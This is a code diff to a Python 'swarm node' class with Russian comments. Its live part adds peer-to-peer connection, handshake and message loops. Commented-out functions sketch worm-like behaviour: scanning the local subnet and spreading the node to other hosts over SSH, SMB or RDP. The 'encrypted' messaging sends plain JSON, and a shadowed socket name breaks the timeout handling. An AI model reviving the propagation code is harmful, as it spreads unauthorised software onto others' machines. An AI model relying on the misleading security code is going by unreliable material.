@@ -324,81 +324,474 @@ class SwarmNode:
                     logger.error(f"Ошибка в цикле прослушивания: {str(e)}")
                     time.sleep(1)  # Предотвращаем 100% загрузку CPU при ошибках
     
+    def _connect_to_node(self, host, port):
+        """Подключается к узлу по указанному адресу и порту."""
+        logger.info(f"Попытка подключения к узлу {host}:{port}")
+        
+        try:
+            # Проверка, что еще не подключены к этому узлу
+            node_address = f"{host}:{port}"
+            with self.nodes_lock:
+                for node_info in self.known_nodes.values():
+                    if node_info.get("address") == node_address:
+                        # Уже знаем об этом узле
+                        logger.debug(f"Узел {host}:{port} уже известен")
+                        return False
+            
+            # Создаем сокет для подключения
+            client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            client_socket.settimeout(5)  # 5 секунд на подключение
+            client_socket.connect((host, port))
+            
+            # Отправляем приветственное сообщение
+            hello_message = {
+                "type": "hello",
+                "node_id": self.node_id,
+                "version": "1.0",
+                "timestamp": time.time()
+            }
+            
+            self._send_encrypted_message(client_socket, hello_message)
+            
+            # Ожидаем ответа
+            response = self._receive_encrypted_message(client_socket)
+            if not response or response.get("type") != "hello_ack":
+                logger.warning(f"Не получен корректный ответ от {host}:{port}")
+                client_socket.close()
+                return False
+            
+            # Получаем ID удаленного узла
+            remote_node_id = response.get("node_id")
+            if not remote_node_id:
+                logger.warning(f"Не получен ID узла от {host}:{port}")
+                client_socket.close()
+                return False
+            
+            if remote_node_id == self.node_id:
+                logger.debug(f"Попытка подключения к самому себе на {host}:{port}")
+                client_socket.close()
+                return False
+            
+            # Регистрируем узел
+            with self.nodes_lock:
+                self.known_nodes[remote_node_id] = {
+                    "address": node_address,
+                    "first_seen": time.time(),
+                    "last_seen": time.time()
+                }
+                self.connected_nodes[remote_node_id] = client_socket
+            
+            # Запускаем поток для приема сообщений
+            receive_thread = threading.Thread(
+                target=self._node_receive_loop,
+                args=(remote_node_id, client_socket),
+                name=f"node_receive_{remote_node_id[:8]}"
+            )
+            receive_thread.daemon = True
+            receive_thread.start()
+            
+            logger.info(f"Успешное подключение к узлу {remote_node_id} на {host}:{port}")
+            return True
+            
+        except Exception as e:
+            logger.debug(f"Ошибка при подключении к {host}:{port}: {str(e)}")
+            return False
+    
+    def _handle_incoming_connection(self, client_socket, addr):
+        """Обрабатывает входящее соединение от другого узла."""
+        logger.debug(f"Обработка входящего соединения от {addr}")
+        
+        try:
+            # Устанавливаем таймаут для операций с сокетом
+            client_socket.settimeout(10)
+            
+            # Ожидаем приветственное сообщение
+            message = self._receive_encrypted_message(client_socket)
+            if not message or message.get("type") != "hello":
+                logger.warning(f"Не получено приветственное сообщение от {addr}")
+                client_socket.close()
+                return
+            
+            # Получаем ID удаленного узла
+            remote_node_id = message.get("node_id")
+            if not remote_node_id:
+                logger.warning(f"Не получен ID узла от {addr}")
+                client_socket.close()
+                return
+            
+            if remote_node_id == self.node_id:
+                logger.warning(f"Попытка подключения от узла с таким же ID ({remote_node_id})")
+                client_socket.close()
+                return
+            
+            # Проверяем, не превышен ли лимит соединений
+            with self.nodes_lock:
+                if len(self.connected_nodes) >= self.max_connections:
+                    logger.warning(f"Превышен лимит соединений. Отклоняем {addr}")
+                    client_socket.close()
+                    return
+            
+            # Отправляем ответ на приветствие
+            hello_ack = {
+                "type": "hello_ack",
+                "node_id": self.node_id,
+                "version": "1.0",
+                "timestamp": time.time()
+            }
+            
+            self._send_encrypted_message(client_socket, hello_ack)
+            
+            # Регистрируем узел
+            with self.nodes_lock:
+                self.known_nodes[remote_node_id] = {
+                    "address": f"{addr[0]}:{addr[1]}",
+                    "first_seen": time.time(),
+                    "last_seen": time.time()
+                }
+                self.connected_nodes[remote_node_id] = client_socket
+            
+            # Запускаем поток для приема сообщений
+            receive_thread = threading.Thread(
+                target=self._node_receive_loop,
+                args=(remote_node_id, client_socket),
+                name=f"node_receive_{remote_node_id[:8]}"
+            )
+            receive_thread.daemon = True
+            receive_thread.start()
+            
+            logger.info(f"Успешно обработано входящее соединение от узла {remote_node_id}")
+            
+        except Exception as e:
+            logger.error(f"Ошибка при обработке входящего соединения от {addr}: {str(e)}")
+            client_socket.close()
+    
+    def _node_receive_loop(self, node_id, socket):
+        """Цикл приема сообщений от подключенного узла."""
+        logger.debug(f"Запуск цикла приема сообщений от узла {node_id}")
+        
+        try:
+            while self.running:
+                try:
+                    message = self._receive_encrypted_message(socket)
+                    if not message:
+                        logger.debug(f"Соединение с узлом {node_id} закрыто")
+                        break
+                    
+                    # Обновляем время последнего взаимодействия
+                    with self.nodes_lock:
+                        if node_id in self.known_nodes:
+                            self.known_nodes[node_id]["last_seen"] = time.time()
+                    
+                    # Обрабатываем сообщение
+                    self._handle_node_message(node_id, message)
+                    
+                except socket.timeout:
+                    continue
+                except Exception as e:
+                    logger.error(f"Ошибка при приеме сообщения от узла {node_id}: {str(e)}")
+                    break
+            
+            # Закрываем соединение при выходе из цикла
+            self._disconnect_node(node_id)
+            
+        except Exception as e:
+            logger.error(f"Критическая ошибка в цикле приема от узла {node_id}: {str(e)}")
+            self._disconnect_node(node_id)
+    
+    def _disconnect_node(self, node_id):
+        """Отключает узел и закрывает соединение."""
+        logger.info(f"Отключение узла {node_id}")
+        
+        with self.nodes_lock:
+            if node_id in self.connected_nodes:
+                try:
+                    self.connected_nodes[node_id].close()
+                except Exception:
+                    pass
+                del self.connected_nodes[node_id]
+    
+    def _handle_node_message(self, node_id, message):
+        """Обрабатывает сообщение от узла."""
+        message_type = message.get("type")
+        
+        if message_type == "ping":
+            # Отвечаем на пинг
+            response = {
+                "type": "pong",
+                "sender_id": self.node_id,
+                "timestamp": time.time()
+            }
+            self._send_message_to_node(node_id, response)
+            
+        elif message_type == "pong":
+            # Просто обновляем время последнего взаимодействия (уже сделано в _node_receive_loop)
+            pass
+            
+        elif message_type == "proposal":
+            # Обрабатываем предложение через движок консенсуса
+            if hasattr(self, "consensus_engine"):
+                # Этот код будет выполнен, если consensus_engine доступен
+                pass
+                
+        elif message_type == "consensus":
+            # Обрабатываем достигнутый консенсус
+            if hasattr(self, "consensus_engine"):
+                # Этот код будет выполнен, если consensus_engine доступен
+                pass
+                
+        elif message_type == "task":
+            # Обрабатываем задачу через распределитель задач
+            if hasattr(self, "task_distributor"):
+                # Этот код будет выполнен, если task_distributor доступен
+                pass
+                
+        elif message_type == "task_result":
+            # Обрабатываем результат задачи
+            if hasattr(self, "task_distributor"):
+                # Этот код будет выполнен, если task_distributor доступен
+                pass
+                
+        else:
+            logger.warning(f"Получено сообщение неизвестного типа от узла {node_id}: {message_type}")
+    
+    def _send_encrypted_message(self, socket, message):
+        """Отправляет зашифрованное сообщение."""
+        try:
+            # В учебной версии просто сериализуем JSON
+            message_json = json.dumps(message)
+            message_bytes = message_json.encode('utf-8')
+            
+            # Отправляем длину сообщения (4 байта)
+            message_length = len(message_bytes)
+            socket.sendall(message_length.to_bytes(4, byteorder='big'))
+            
+            # Отправляем само сообщение
+            socket.sendall(message_bytes)
+            
+            return True
+        except Exception as e:
+            logger.error(f"Ошибка при отправке сообщения: {str(e)}")
+            return False
+    
+    def _receive_encrypted_message(self, socket):
+        """Принимает зашифрованное сообщение."""
+        try:
+            # Получаем длину сообщения (4 байта)
+            length_bytes = socket.recv(4)
+            if not length_bytes:
+                return None  # Соединение закрыто
+                
+            message_length = int.from_bytes(length_bytes, byteorder='big')
+            
+            # Получаем само сообщение
+            message_bytes = b''
+            while len(message_bytes) < message_length:
+                chunk = socket.recv(message_length - len(message_bytes))
+                if not chunk:
+                    return None  # Соединение закрыто
+                message_bytes += chunk
+            
+            # В учебной версии просто десериализуем JSON
+            message_json = message_bytes.decode('utf-8')
+            message = json.loads(message_json)
+            
+            return message
+        except Exception as e:
+            logger.error(f"Ошибка при приеме сообщения: {str(e)}")
+            return None
+    
+    def _discovery_loop(self):
+        """Цикл обнаружения других узлов в сети (безопасная версия)."""
+        logger.info("Запуск цикла обнаружения узлов")
+        
+        while self.running:
+            try:
+                # Безопасный режим обнаружения - только через известные точки входа
+                for bootstrap_node in self.bootstrap_nodes:
+                    try:
+                        host, port = bootstrap_node.split(":")
+                        port = int(port)
+                        self._connect_to_node(host, port)
+                    except Exception as e:
+                        logger.debug(f"Ошибка подключения к {bootstrap_node}: {str(e)}")
+                
+                # Отправка сигналов присутствия в сеть для обнаружения
+                self._ping_known_nodes()
+                
+                # Задержка между циклами обнаружения (в безопасном режиме - большой интервал)
+                time.sleep(60)  # 1 минута между попытками обнаружения
+                
+            except Exception as e:
+                logger.error(f"Ошибка в цикле обнаружения: {str(e)}")
+                time.sleep(10)  # Защита от слишком частых попыток при ошибках
+    
+    def _ping_known_nodes(self):
+        """Отправляет сигналы присутствия известным узлам."""
+        with self.nodes_lock:
+            for node_id, node_info in list(self.known_nodes.items()):
+                try:
+                    message = {
+                        "type": "ping",
+                        "sender_id": self.node_id,
+                        "timestamp": time.time()
+                    }
+                    
+                    # Отправляем только узлам, с которыми нет активного соединения
+                    if node_id not in self.connected_nodes:
+                        self._send_message_to_node(node_id, message)
+                        
+                except Exception as e:
+                    logger.debug(f"Ошибка при пинге узла {node_id}: {str(e)}")
+    
+    def _sync_loop(self):
+        """Цикл синхронизации данных между узлами."""
+        logger.info("Запуск цикла синхронизации данных")
+        
+        while self.running:
+            try:
+                # Периодический обмен данными между узлами
+                with self.nodes_lock:
+                    for node_id in list(self.connected_nodes):
+                        self._sync_with_node(node_id)
+                
+                # Задержка между синхронизациями
+                time.sleep(30)  # 30 секунд между синхронизациями
+                
+            except Exception as e:
+                logger.error(f"Ошибка в цикле синхронизации: {str(e)}")
+                time.sleep(5)
+    
+    def _monitor_loop(self):
+        """Цикл мониторинга состояния сети."""
+        logger.info("Запуск цикла мониторинга сети")
+        
+        while self.running:
+            try:
+                # Проверка активности узлов
+                self._check_node_activity()
+                
+                # Обновление статистики
+                self._update_network_stats()
+                
+                # Задержка между проверками
+                time.sleep(15)  # 15 секунд между проверками
+                
+            except Exception as e:
+                logger.error(f"Ошибка в цикле мониторинга: {str(e)}")
+                time.sleep(5)
+    
+    def _decision_loop(self):
+        """Цикл принятия решений в рое."""
+        logger.info("Запуск цикла принятия решений")
+        
+        while self.running:
+            try:
+                # Анализ состояния и принятие решений на основе данных
+                self._analyze_and_decide()
+                
+                # Задержка между циклами принятия решений
+                time.sleep(60)  # 1 минута между циклами принятия решений
+                
+            except Exception as e:
+                logger.error(f"Ошибка в цикле принятия решений: {str(e)}")
+                time.sleep(10)
+    
+    # Заглушки для необходимых методов
+    
+    def _sync_with_node(self, node_id):
+        """Синхронизирует данные с узлом."""
+        pass
+    
+    def _check_node_activity(self):
+        """Проверяет активность узлов."""
+        pass
+    
+    def _update_network_stats(self):
+        """Обновляет статистику сети."""
+        pass
+    
+    def _analyze_and_decide(self):
+        """Анализирует данные и принимает решения."""
+        pass
+    
+    def _send_message_to_node(self, node_id, message):
+        """Отправляет сообщение указанному узлу."""
+        pass
+    
     # Другие методы класса...
     
     # ВАЖНО: Закомментированный код для критических функций
 
-"""
-    def _explore_network(self):
-        """Активно исследует сеть для поиска других агентов."""
-        logger.info("Начинаем активное сканирование сети")
-        
-        try:
-            # Получаем локальный IP и маску сети
-            local_ip = self._get_local_ip()
-            if not local_ip:
-                return
-            
-            network = self._get_network_cidr(local_ip)
-            if not network:
-                return
-            
-            logger.info(f"Сканирование сети {network}")
-            
-            # Генерируем список IP для сканирования
-            ip_network = ipaddress.IPv4Network(network, strict=False)
-            
-            # Создаем пул потоков для быстрого сканирования
-            with ThreadPoolExecutor(max_workers=50) as executor:
-                # Подготавливаем задания на сканирование
-                scan_targets = [
-                    (str(ip), self.listen_port) for ip in ip_network
-                    if str(ip) != local_ip and not ip.is_multicast
-                ]
-                
-                # Запускаем сканирование
-                executor.map(lambda args: self._scan_target(*args), scan_targets)
-        
-        except Exception as e:
-            logger.error(f"Ошибка при сканировании сети: {str(e)}")
-    
-    def _propagate(self, target_ip: str, target_port: int = None):
-        """
-        Пытается распространить узел на целевую систему.
-        
-        ВНИМАНИЕ: Эта функция может нарушать законодательство во многих странах.
-        Используйте только на системах, которыми владеете или имеете разрешение.
-        """
-        logger.info(f"Попытка распространения на {target_ip}")
-        
-        try:
-            # Проверяем основные порты для возможных уязвимостей
-            open_ports = self._scan_common_services(target_ip)
-            if not open_ports:
-                logger.warning(f"Не найдено открытых портов на {target_ip}")
-                return False
-            
-            # Пытаемся определить ОС
-            target_os = self._detect_os(target_ip)
-            logger.info(f"Обнаружена ОС: {target_os}")
-            
-            # Выбираем метод распространения в зависимости от ОС и открытых портов
-            if 22 in open_ports and target_os != "Windows":
-                # SSH
-                return self._propagate_ssh(target_ip)
-            elif 445 in open_ports and target_os == "Windows":
-                # SMB
-                return self._propagate_smb(target_ip)
-            elif 3389 in open_ports and target_os == "Windows":
-                # RDP
-                return self._propagate_rdp(target_ip)
-            
-            return False
-        
-        except Exception as e:
-            logger.error(f"Ошибка при попытке распространения: {str(e)}")
-            return False
-"""
+# Закомментированные критические функции (отключены в целях безопасности)
+# def _explore_network(self):
+#     """Активно исследует сеть для поиска других агентов."""
+#     logger.info("Начинаем активное сканирование сети")
+#     
+#     try:
+#         # Получаем локальный IP и маску сети
+#         local_ip = self._get_local_ip()
+#         if not local_ip:
+#             return
+#         
+#         network = self._get_network_cidr(local_ip)
+#         if not network:
+#             return
+#         
+#         logger.info(f"Сканирование сети {network}")
+#         
+#         # Генерируем список IP для сканирования
+#         ip_network = ipaddress.IPv4Network(network, strict=False)
+#         
+#         # Создаем пул потоков для быстрого сканирования
+#         with ThreadPoolExecutor(max_workers=50) as executor:
+#             # Подготавливаем задания на сканирование
+#             scan_targets = [
+#                 (str(ip), self.listen_port) for ip in ip_network
+#                 if str(ip) != local_ip and not ip.is_multicast
+#             ]
+#             
+#             # Запускаем сканирование
+#             executor.map(lambda args: self._scan_target(*args), scan_targets)
+#     
+#     except Exception as e:
+#         logger.error(f"Ошибка при сканировании сети: {str(e)}")
+# 
+# def _propagate(self, target_ip: str, target_port: int = None):
+#     """
+#     Пытается распространить узел на целевую систему.
+#     
+#     ВНИМАНИЕ: Эта функция может нарушать законодательство во многих странах.
+#     Используйте только на системах, которыми владеете или имеете разрешение.
+#     """
+#     logger.info(f"Попытка распространения на {target_ip}")
+#     
+#     try:
+#         # Проверяем основные порты для возможных уязвимостей
+#         open_ports = self._scan_common_services(target_ip)
+#         if not open_ports:
+#             logger.warning(f"Не найдено открытых портов на {target_ip}")
+#             return False
+#         
+#         # Пытаемся определить ОС
+#         target_os = self._detect_os(target_ip)
+#         logger.info(f"Обнаружена ОС: {target_os}")
+#         
+#         # Выбираем метод распространения в зависимости от ОС и открытых портов
+#         if 22 in open_ports and target_os != "Windows":
+#             # SSH
+#             return self._propagate_ssh(target_ip)
+#         elif 445 in open_ports and target_os == "Windows":
+#             # SMB
+#             return self._propagate_smb(target_ip)
+#         elif 3389 in open_ports and target_os == "Windows":
+#             # RDP
+#             return self._propagate_rdp(target_ip)
+#         
+#         return False
+#     
+#     except Exception as e:
+#         logger.error(f"Ошибка при попытке распространения: {str(e)}")
+#         return False
 
 # Вспомогательные классы для роевого интеллекта
 
